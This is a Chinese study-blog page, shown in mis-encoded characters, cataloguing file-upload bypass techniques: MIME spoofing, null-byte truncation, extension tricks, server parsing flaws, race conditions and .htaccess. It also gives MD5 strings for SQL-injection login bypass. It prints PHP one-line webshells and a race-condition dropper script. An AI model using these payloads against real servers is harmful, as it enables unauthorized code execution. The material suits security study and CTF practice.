<p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°è¿™æ ·å­çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œç»™å‡ºä¸¤ä¸ªå§ã€‚</p>
<p>ffifdyopï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>

<p>129581926211651571912466741651878684928ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8</span><br><span class="line">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
	
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/10/10/file_upload/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="Record my study life">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="chleynx's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/10/file_upload/" class="post-title-link" itemprop="url">æ–‡ä»¶ä¸Šä¼ </a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-10-10 18:38:57" itemprop="dateCreated datePublished" datetime="2023-10-10T18:38:57+08:00">2023-10-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-08-10 01:38:29" itemprop="dateModified" datetime="2024-08-10T01:38:29+08:00">2024-08-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Summary/" itemprop="url" rel="index"><span itemprop="name">Summary</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å‰ç«¯ç»•è¿‡"><a href="#å‰ç«¯ç»•è¿‡" class="headerlink" title="å‰ç«¯ç»•è¿‡"></a>å‰ç«¯ç»•è¿‡</h1><p>æ­£å¸¸ä¸Šä¼ æ–‡ä»¶,æ‰å–æ•°æ®åŒ…ä¿®æ”¹ï¼ˆbpæŠ“åŒ…æ”¹åç¼€ï¼‰</p>
<h1 id="åç«¯ç»•è¿‡"><a href="#åç«¯ç»•è¿‡" class="headerlink" title="åç«¯ç»•è¿‡"></a>åç«¯ç»•è¿‡</h1><p>æœåŠ¡å™¨ç«¯æ£€æµ‹çš„ç»•è¿‡</p>
<h2 id="å‡½æ•°ç‰¹æ€§"><a href="#å‡½æ•°ç‰¹æ€§" class="headerlink" title="å‡½æ•°ç‰¹æ€§"></a>å‡½æ•°ç‰¹æ€§</h2><p>move_uploaded_fileå‡½æ•°ä¼šè‡ªåŠ¨å»é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ å’Œ &#x2F;.</p>
<p><code>fopen</code>å‡½æ•°ç‰¹æ€§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=&#x27;1.php/.&#x27;;</span><br><span class="line">$content=&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;</span><br><span class="line">$f = fopen($filename, &#x27;w&#x27;);</span><br><span class="line">    fwrite($f, $content);</span><br><span class="line">    fclose($f);    </span><br><span class="line">?&gt; </span><br><span class="line">#ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆ1.php,æ–‡ä»¶åä¸º1.php.ä¹Ÿå¯ä»¥</span><br><span class="line">â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span><br></pre></td></tr></table></figure>

<h5 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h5><p>åç¼€åå¤§å°å†™</p>
<p>åç¼€ååŒå†™</p>
<p><code>å°è¯•php3 phtml php3457(linux+apache+php5.6)ç­‰åç¼€</code></p>
<p>æ£€æµ‹MIMEç±»å‹çš„,æ‰åŒ…æ”¹MIMEç±»å‹</p>
<h3 id="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆMINEç±»å‹æ£€æµ‹ï¼‰"><a href="#æœåŠ¡ç«¯æ£€æµ‹ï¼ˆMINEç±»å‹æ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆMINEç±»å‹æ£€æµ‹ï¼‰ #"></a>æœåŠ¡ç«¯æ£€æµ‹ï¼ˆMINEç±»å‹æ£€æµ‹ï¼‰ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-mine%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B">#</a></h3><blockquote>
<p>MIME (Multipurpose Internet Mail Extensions) æ˜¯æè¿°æ¶ˆæ¯å†…å®¹ç±»å‹çš„å› ç‰¹ç½‘æ ‡å‡†ã€‚</p>
</blockquote>
<p>æœåŠ¡å™¨ä»£ç åˆ¤æ–­$_FILES[â€fileâ€œ][â€œtypeâ€]æ˜¯ä¸æ˜¯å›¾ç‰‡æ ¼å¼ï¼ˆ<code>image/jpeg</code>ã€<code>image/png</code>ã€<code>image/gif</code>ï¼‰ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™ä¸å…è®¸ä¸Šä¼ è¯¥æ–‡ä»¶ã€‚</p>
<p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<blockquote>
<p>æŠ“åŒ…åæ›´æ”¹Content-Typeä¸ºå…è®¸çš„ç±»å‹ç»•è¿‡è¯¥ä»£ç é™åˆ¶ï¼Œæ¯”å¦‚å°†phpæ–‡ä»¶çš„<code>Content-Type:application/octet-stream</code>ä¿®æ”¹ä¸º<code>image/jpeg</code>ã€<code>image/png</code>ã€<code>image/gif</code>ç­‰å°±å¯ä»¥</p>
</blockquote>
<p>å¸¸è§MIMETYPE</p>
<blockquote>
<p>audio&#x2F;mpeg -&gt; .mp3 application&#x2F;msword -&gt; .doc application&#x2F;octet-stream -&gt; .exe application&#x2F;pdf -&gt; .pdf application&#x2F;x-javascript -&gt; .js application&#x2F;x-rar -&gt; .rar application&#x2F;zip -&gt; .zip image&#x2F;gif -&gt; .gif image&#x2F;jpeg -&gt; .jpg &#x2F; .jpeg image&#x2F;png -&gt; .png text&#x2F;plain -&gt; .txt text&#x2F;html -&gt; .html video&#x2F;mp4 -&gt; .mp4</p>
</blockquote>
<h3 id="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆç›®å½•è·¯å¾„æ£€æµ‹ï¼‰"><a href="#æœåŠ¡ç«¯æ£€æµ‹ï¼ˆç›®å½•è·¯å¾„æ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆç›®å½•è·¯å¾„æ£€æµ‹ï¼‰ #"></a>æœåŠ¡ç«¯æ£€æµ‹ï¼ˆç›®å½•è·¯å¾„æ£€æµ‹ï¼‰ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84%E6%A3%80%E6%B5%8B">#</a></h3><p>å¯¹ç›®å½•è·¯å¾„çš„æ£€æµ‹ä¸å¤Ÿä¸¥è°¨è€Œå¯¼è‡´å¯ä»¥ä½¿ç”¨%00æˆªæ–­ç»•è¿‡è¿›è¡Œæ”»å‡»ã€‚</p>
<p>ç»•è¿‡æ–¹æ³•:</p>
<blockquote>
<ul>
<li>ä¾‹å¦‚ï¼š&#x2F;111.php%00.gif&#x2F;111.gif -&gt; &#x2F;111.php</li>
</ul>
</blockquote>
<h3 id="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰"><a href="#æœåŠ¡ç«¯æ£€æµ‹ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰ #"></a>æœåŠ¡ç«¯æ£€æµ‹ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%A3%80%E6%B5%8B">#</a></h3><p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<blockquote>
<ul>
<li>æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼Œå¦‚ï¼š<code>*.pHp</code> <code>*.aSP</code></li>
<li>æ–‡ä»¶ååŒå†™ç»•è¿‡ï¼Œå¦‚ï¼š<code>*.pphphp</code></li>
<li>Unicodeï¼š å½“ç›®æ ‡å­˜åœ¨json_decodeä¸”æ£€æŸ¥åœ¨json_decodeä¹‹å‰,å¯ä»¥å°†phpå†™ä¸º<code>\u0070hp</code></li>
<li>åå•åˆ—è¡¨ç»•è¿‡ï¼Œå¦‚ï¼š<code>*.asa</code> <code>*.cer</code></li>
<li>ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼Œæ¯”å¦‚windowsæ–‡ä»¶åæœ€åä¸èƒ½æœ‰.æˆ–ç©ºæ ¼ï¼Œå¯è®¾ä¸º<code>*.php.</code>æˆ–<code>*.php+</code></li>
<li>0x00æˆªæ–­ç»•è¿‡ï¼Œæ¯”å¦‚ï¼š<code>*.php(0x00).jpg</code> æˆ– <code>*.php%00.jpg</code></li>
<li>æ–‡ä»¶åŒ…å«æ¼æ´</li>
<li>æœåŠ¡å™¨è§£ææ¼æ´</li>
<li>.htaccessæ–‡ä»¶æ”»å‡»</li>
</ul>
</blockquote>
<h3 id="æ–‡ä»¶æˆªæ–­ç»•è¿‡æ”»å‡»"><a href="#æ–‡ä»¶æˆªæ–­ç»•è¿‡æ”»å‡»" class="headerlink" title="æ–‡ä»¶æˆªæ–­ç»•è¿‡æ”»å‡» #"></a>æ–‡ä»¶æˆªæ–­ç»•è¿‡æ”»å‡» <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB">#</a></h3><blockquote>
<p>æˆªæ–­ç±»å‹ï¼šPHP%00æˆªæ–­</p>
<p>æˆªæ–­åŸç†ï¼šç”±äº00ä»£è¡¨ç»“æŸç¬¦ï¼Œæ‰€ä»¥ä¼šæŠŠ00åé¢çš„æ‰€æœ‰å­—ç¬¦åˆ é™¤</p>
<p>æˆªæ–­æ¡ä»¶ï¼šPHPç‰ˆæœ¬å°äº5.3.4ï¼ŒPHPçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</p>
</blockquote>
<p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<blockquote>
<ul>
<li>ä¾‹å¦‚ä¸Šä¼ æ–‡ä»¶shell.phpï¼Œä¸Šä¼ æ–‡ä»¶è·¯å¾„ä¸º&#x2F;?upload&#x3D;shell.php</li>
<li>ç»•è¿‡ï¼š&#x2F;?upload&#x3D;shell.php%00.jpg -&gt; &#x2F;?upload&#x3D;shell.php</li>
</ul>
</blockquote>
<h3 id="è§£ææ¼æ´æ”»å‡»"><a href="#è§£ææ¼æ´æ”»å‡»" class="headerlink" title="è§£ææ¼æ´æ”»å‡» #"></a>è§£ææ¼æ´æ”»å‡» <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB">#</a></h3><p>ä¸»è¦æœ‰ç›®å½•è§£æã€æ–‡ä»¶è§£æï¼ŒApacheè§£ææ¼æ´ã€Nginxè§£ææ¼æ´ã€IIS7.5è§£ææ¼æ´ã€‚</p>
<h4 id="ç›®å½•è§£æ"><a href="#ç›®å½•è§£æ" class="headerlink" title="ç›®å½•è§£æ #"></a>ç›®å½•è§£æ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90">#</a></h4><blockquote>
<ul>
<li>å½¢å¼ï¼š<code>www.xxx.com/xxx.asp/xxx.jpg</code></li>
<li>åŸç†ï¼šæœåŠ¡å™¨ä¼šé»˜è®¤æŠŠ <code>.asp</code> å’Œ <code>.asp</code>ç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶</li>
</ul>
</blockquote>
<h4 id="æ–‡ä»¶è§£æ"><a href="#æ–‡ä»¶è§£æ" class="headerlink" title="æ–‡ä»¶è§£æ #"></a>æ–‡ä»¶è§£æ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90">#</a></h4><blockquote>
<ul>
<li>å½¢å¼ï¼š<code>www.xxx.com/xxx.asp;.jpg</code></li>
<li>åŸç†ï¼šæœåŠ¡å™¨é»˜è®¤ä¸è§£æ<code>;</code>åé¢çš„å†…å®¹ï¼Œå› æ­¤<code>xxx.asp;jpg</code>è¢«è§£æä¸º<code>xxx.asp</code>æ–‡ä»¶äº†</li>
</ul>
</blockquote>
<h4 id="Apacheè§£ææ¼æ´"><a href="#Apacheè§£ææ¼æ´" class="headerlink" title="Apacheè§£ææ¼æ´ #"></a>Apacheè§£ææ¼æ´ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><p>æœåŠ¡å™¨ä»£ç ä¸­é™åˆ¶äº†æŸäº›åç¼€çš„æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œä½†æ˜¯æœ‰äº›Apacheæ˜¯å…è®¸è§£æå…¶å®ƒåç¼€çš„ï¼Œä¾‹å¦‚åœ¨httpd.confä¸­å¦‚æœé…ç½®æœ‰å¦‚ä¸‹ä»£ç ï¼Œåˆ™èƒ½å¤Ÿè§£æphpå’Œphtmlæ–‡ä»¶</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>

<p>1</p>
<p>å¸¸ç”¨åç¼€ï¼š<code>*.php</code> <code>*.php3</code> <code>*.php4</code> <code>*.php5</code> <code>*.phtml</code> <code>*.pht</code></p>
<p>åœ¨Apacheçš„è§£æé¡ºåºä¸­ï¼Œæ˜¯ä»å³åˆ°å·¦å¼€å§‹è§£ææ–‡ä»¶åç¼€çš„ï¼Œå¦‚æœæœ€å³ä¾§çš„æ‰©å±•åä¸å¯è¯†åˆ«ï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ï¼Œç›´åˆ°é‡åˆ°å¯ä»¥è§£æçš„æ–‡ä»¶åç¼€ä¸ºæ­¢ã€‚å› æ­¤ï¼Œä¾‹å¦‚ä¸Šä¼ çš„æ–‡ä»¶åä¸º1.php.xxxxï¼Œå› ä¸ºåç¼€xxxxä¸å¯è§£æï¼Œæ‰€ä»¥å‘å·¦è§£æåç¼€phpã€‚</p>
<blockquote>
<ul>
<li>ä¾‹å¦‚ï¼š<code>shell.php.qwe.asd</code> -&gt;<code>shell.php</code></li>
</ul>
</blockquote>
<h4 id="Nginxè§£ææ¼æ´"><a href="#Nginxè§£ææ¼æ´" class="headerlink" title="Nginxè§£ææ¼æ´ #"></a>Nginxè§£ææ¼æ´ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><blockquote>
<p>Nginxé»˜è®¤æ˜¯ä»¥CGIçš„æ–¹å¼æ”¯æŒPHPè§£æçš„ï¼Œæ™®éçš„åšæ³•æ˜¯åœ¨Nginxé…ç½®æ–‡ä»¶ä¸­é€šè¿‡ æ­£åˆ™åŒ¹é…è®¾ç½®<strong>SCRIPT_FILENAME</strong>ã€‚å½“è®¿é—®<code>www.xxx.com/phpinfo.jpg/1.php</code>è¿™ä¸ª URLæ—¶ï¼Œ$fastcgi_script_nameä¼šè¢«è®¾ç½®ä¸ºâ€œphpinfo.jpg&#x2F;1.phpâ€ï¼Œç„¶åæ„é€ æˆ SCRIPT_FILENAMEä¼ é€’ç»™PHP CGIã€‚</p>
<p>åŸå› æ˜¯å¼€å¯äº† fix_pathinfo è¿™ä¸ªé€‰é¡¹ï¼Œä¼šè§¦å‘ åœ¨PHPä¸­çš„å¦‚ä¸‹é€»è¾‘ï¼š PHPä¼šè®¤ä¸ºSCRIPT_FILENAMEæ˜¯phpinfo.jpgï¼Œè€Œ1.phpæ˜¯PATH_INFOï¼Œæ‰€ä»¥å°±ä¼š å°†phpinfo.jpgä½œä¸ºPHPæ–‡ä»¶æ¥è§£æäº†ã€‚</p>
</blockquote>
<p>æ”»å‡»æ–¹å¼</p>
<blockquote>
<ul>
<li>å½¢å¼ï¼š <code>www.xxxx.com/UploadFiles/image/1.jpg/1.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg%00.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</code></li>
<li>å¦ä¸€ç§æ–¹æ³•ï¼šä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºtest.jpgï¼Œç„¶åè®¿é—®<code>test.jpg/.php</code>,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬shell.phpã€‚</li>
</ul>
</blockquote>
<h4 id="IIS7-5è§£ææ¼æ´"><a href="#IIS7-5è§£ææ¼æ´" class="headerlink" title="IIS7.5è§£ææ¼æ´ #"></a>IIS7.5è§£ææ¼æ´ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#iis7-5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><blockquote>
<p>IIS7.5çš„æ¼æ´ä¸nginxçš„ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”±äºphpé…ç½®æ–‡ä»¶ä¸­ï¼Œå¼€å¯äº† <strong>cgi.fix_pathinfo</strong>ï¼Œè€Œè¿™å¹¶ä¸æ˜¯nginxæˆ–è€…iis7.5æœ¬èº«çš„æ¼æ´ã€‚</p>
</blockquote>
<h3 id="ç«äº‰æ¡ä»¶æ”»å‡»"><a href="#ç«äº‰æ¡ä»¶æ”»å‡»" class="headerlink" title="ç«äº‰æ¡ä»¶æ”»å‡» #"></a>ç«äº‰æ¡ä»¶æ”»å‡» <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB">#</a></h3><p>ä¸€äº›ç½‘ç«™ä¸Šä¼ æ–‡ä»¶çš„é€»è¾‘æ—¶å…ˆå…è®¸ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œç„¶åæ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶æ˜¯å¦åŒ…å«WebShellè„šæœ¬ï¼Œå¦‚æœåŒ…å«åˆ™åˆ é™¤è¯¥æ–‡ä»¶ã€‚è¿™é‡Œå­˜åœ¨çš„é—®é¢˜æ˜¯æ–‡ä»¶ä¸Šä¼ æˆåŠŸåå’Œåˆ é™¤æ–‡ä»¶ä¹‹é—´å­˜åœ¨ä¸€ä¸ªçŸ­æš‚çš„æ—¶é—´å·®ï¼ˆå› ä¸ºéœ€è¦æ‰§è¡Œæ£€æŸ¥æ–‡ä»¶å’Œåˆ é™¤æ–‡ä»¶çš„æ“ä½œï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®å®Œæˆç«äº‰æ¡ä»¶çš„ä¸Šä¼ æ¼æ´æ”»å‡»ã€‚</p>
<p>æ”»å‡»æ–¹æ³•ï¼š</p>
<blockquote>
<ul>
<li>æ”»å‡»è€…éœ€è¦å…ˆä¸Šä¼ ä¸€ä¸ªWebShellè„šæœ¬1.phpï¼Œ1.phpçš„å†…å®¹ä¸ºç”Ÿæˆä¸€ä¸ªæ–°çš„WebShellè„šæœ¬shell.phpï¼Œ1.phpå†™å…¥å¦‚ä¸‹ä»£ç </li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&quot;../shell.php&quot;, &quot;w&quot;),&#x27;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li>å½“1.phpä¸Šä¼ å®Œæˆåï¼Œå®¢æˆ·ç«¯ç«‹å³è®¿é—®1.phpï¼Œåˆ™ä¼šåœ¨æœåŠ¡ç«¯å½“å‰ç›®å½•ä¸‹è‡ªåŠ¨ç”Ÿæˆshell.phpï¼Œè¿™æ—¶æ”»å‡»è€…å°±åˆ©ç”¨äº†æ—¶é—´å·®å®Œæˆäº†WebShellçš„ä¸Šä¼ </li>
</ul>
</blockquote>
<h3 id="åŒæ–‡ä»¶ä¸Šä¼ "><a href="#åŒæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="åŒæ–‡ä»¶ä¸Šä¼  #"></a>åŒæ–‡ä»¶ä¸Šä¼  <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%8F%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">#</a></h3><p>æœ¬æ„ä¸ºä¸Šä¼ ä¸¤ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶å»çªç ´ã€‚ä¸Šä¼ ç‚¹æ”¯æŒå¤šæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯å´åªå¯¹ç¬¬ä¸€ä¸ªæ–‡ä»¶åšäº†è¿‡æ»¤ã€‚</p>
<p>åˆ©ç”¨æ–¹å¼ï¼š</p>
<blockquote>
<ul>
<li>åœ¨å­˜åœ¨åŒæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„é¡µé¢ä¸­ï¼ŒæŸ¥çœ‹ä¸Šä¼ çš„é¡µé¢ã€‚F12æ‰¾åˆ°ä¸Šä¼ çš„postè¡¨å•ï¼Œactionå±æ€§æ˜¯æŒ‡å®šä¸Šä¼ æ£€æµ‹é¡µé¢ï¼Œä¸€èˆ¬æ˜¯å†™çš„ç»å¯¹è·¯å¾„ï¼Œæ¯”å¦‚ï¼š<code>xxx.asp/xxx.php</code></li>
<li>è¡¥å…¨urlï¼š<code>https://www.xxx.com/xxx.php(asp)</code></li>
<li>æ„é€ æœ¬åœ°postæäº¤è¡¨å•</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><br><span class="line">name=&quot;form1&quot; enctype=&quot;multipart/formâ€data&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ—¶åªéœ€è¦ä¿®æ”¹actionçš„å€¼ä¸ºæŒ‡å®šä¸Šä¼ é¡µé¢å³å¯</p>
<ul>
<li>ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å…è®¸çš„æ–‡ä»¶ç±»å‹ï¼ˆ<code>.jpg</code> <code>.png</code> <code>.gif</code> ç­‰ï¼‰ï¼Œç¬¬äºŒä¸ªä¸Šä¼ æ–‡ä»¶æ˜¯ä¸€å¥è¯æœ¨é©¬æˆ–è€…WebShellè„šæœ¬ã€‚è¿™æ ·å°±å¯ä»¥çªç ´ä¸Šä¼ é™åˆ¶ï¼ŒæˆåŠŸä¸Šä¼ æœ¨é©¬åˆ°æœåŠ¡å™¨ã€‚</li>
</ul>
</blockquote>
<h3 id="php3457"><a href="#php3457" class="headerlink" title="php3457 #"></a>php3457 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#php3457">#</a></h3><blockquote>
<p>è¯¥é¡¹ä¸ºapacheä¸“å±ã€‚å…³é”®ç‚¹åœ¨<code>/etc/apache2/mods-available/php5.6.conf</code>è¿™ä¸ªæ–‡ä»¶ï¼Œæ»¡è¶³<code>.+\.ph(p[3457]?|t|tml)$</code>ï¼Œéƒ½ä¼šè¢«å½“ä½œphpæ–‡ä»¶è§£æã€‚</p>
<p>åœ¨apache2ç›®å½•ä¸‹<code>grep -r x-httpd-php /etc/apache2</code>æ‰¾åˆ°å¯¹åº”æ–‡ä»¶å°±èƒ½çŸ¥é“è§£æå“ªäº›åç¼€ã€‚</p>
</blockquote>
<h3 id="htaccessæ–‡ä»¶æ”»å‡»"><a href="#htaccessæ–‡ä»¶æ”»å‡»" class="headerlink" title=".htaccessæ–‡ä»¶æ”»å‡» #"></a>.htaccessæ–‡ä»¶æ”»å‡» <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#htaccess%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB">#</a></h3><blockquote>
<p>.htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚</p>
<p>æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p>
